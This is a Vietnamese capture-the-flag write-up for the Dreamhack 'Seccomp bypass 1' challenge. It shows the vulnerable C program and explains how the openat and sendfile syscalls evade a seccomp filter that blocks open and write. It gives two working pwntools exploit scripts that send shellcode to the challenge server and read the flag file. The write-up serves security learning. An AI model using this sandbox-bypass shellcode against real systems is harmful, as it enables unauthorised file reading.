# Seccomp bypass 1

## source

```c
// Name: bypass_syscall.c
// Compile: gcc -o bypass_syscall bypass_syscall.c -lseccomp

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void sandbox() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);

  seccomp_load(ctx);
}

int main(int argc, char *argv[]) {
  void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  memset(shellcode, 0, 0x1000);

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sandbox();

  sc = (void *)shellcode;
  sc();
}
```

## Ý tưởng

- Lần trước chúng ta đã tìm hiểu seccomp với 2 chế độ, lần cũng tương tự là filter, chương trình cho phép, hoặc hạn chế một số syscall, trong bài này là nó sẽ hạn chế các syscall như `open, execve, execveat, write`
- dùng `seccomp tools` để kiểm tra chính xác hơn [link tải](https://github.com/david942j/seccomp-tools)
  ![image](https://user-images.githubusercontent.com/111769169/233795507-5115b118-3b0c-476b-b08c-5c57981fdac7.png)

- Ta thấy ta không thể bypass bằng cách `> 0x40000000` (hình như là các syscall 32 bit)
- Vậy không thể bypass bằng cách sử dụng syscall 32 bit thì ta sẽ bypass = cách sử dụng các syscall có chức năng tương tự như `open, write` trong đó có 2 syscall có chức năng tương tự là `openat và sendfile`
- openat để đọc file và sendlfile để hiển thị

## Khai thác

### tạo shell bằng pwntools

- do chương trình thực hiện shellcode
- Đường dẫn để đưa vào openat ta có thể đọc trong file Docker

```
ENV user bypass_syscall
ADD ./flag /home/$user/flag
```

```python
from pwn import *

#p = process('./bypass_syscall')
p = remote('host3.dreamhack.games',14198)

context.arch = 'x86_64'

pay = shellcraft.openat(0,'/home/bypass_syscall/flag')
pay += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(': ',asm(pay))
p.interactive()
```

### tạo shell bằng tay

- Đầu tiên syscall `sys_openat` ta sẽ set rdi = 0 và rsi = '/home/bypass_syscall/flag'
- Tiếp đến `sendfile` cần rdi = 1, rsi = rax, rdx = 0, r10 = 0x64

```python
from pwn import *

# p = process('./bypass_syscall')
p = remote('host3.dreamhack.games', 9464)

context.arch = 'x86_64'
# gdb.attach(p, gdbscript= '''
#            b*main+154
#            c
#            ''')
shellcode = asm("""
                push 0x67
                mov rax, 0x616c662f6c6c6163
                push rax
                mov rax, 0x7379735f73736170
                push rax
                mov rax, 0x79622f656d6f682f
                push rax
                
                mov rsi, rsp
                xor rdi, rdi
                xor rdx, rdx
                mov rax, 0x101
                syscall
                
                mov rdi, 0x1
                mov r10, 0x64
                xor edx, edx
                mov rsi, rax
                mov rax, 0x28
                syscall
                
                """)

# shellcode = shellcraft.openat(0,'/home/bypass_syscall/flag')
# shellcode += shellcraft.sendfile(1,'rax',0,100)

p.sendlineafter(b': ', (shellcode))
p.interactive()
```

## Kết quả

